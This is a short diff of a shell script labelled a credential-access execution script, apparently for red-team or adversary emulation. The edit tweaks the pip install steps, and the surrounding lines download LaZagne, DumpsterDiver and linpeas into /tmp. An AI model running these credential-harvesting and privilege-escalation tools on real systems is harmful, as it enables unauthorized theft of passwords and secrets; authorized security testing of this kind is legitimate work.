@@ -46,9 +46,9 @@ whoami
 #Credential Access Execution Script
 #Download tools
 /bin/bash -c 'curl -L http://github.com/securing/DumpsterDiver/archive/master.tar.gz | tar zxf - -C /tmp'
-/bin/bash -c 'cd /tmp/DumpsterDiver-master; python3 -m venv env; source "env/bin/activate"; pip3 install wheel; pip3 install -r requirements.txt'
+/bin/bash -c 'cd /tmp/DumpsterDiver-master; python3 -m venv env; source "env/bin/activate"; pip3 install -U pip; pip3 install wheel; pip3 install -r requirements.txt'
 /bin/bash -c 'curl -L http://github.com/AlessandroZ/LaZagne/archive/master.tar.gz | tar zxf - -C /tmp'
-/bin/bash -c 'cd /tmp/LaZagne-master; python3 -m venv env; source "env/bin/activate"; pip3 install wheel python3-setuptools ; pip3 install -r requirements.txt'
+/bin/bash -c 'cd /tmp/LaZagne-master; python3 -m venv env; source "env/bin/activate"; pip3 install -U pip; pip3 install wheel setuptools ; pip3 install -r requirements.txt'
 /bin/bash -c 'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh'
 /bin/bash -c 'chmod +x /tmp/linpeas.sh'
 
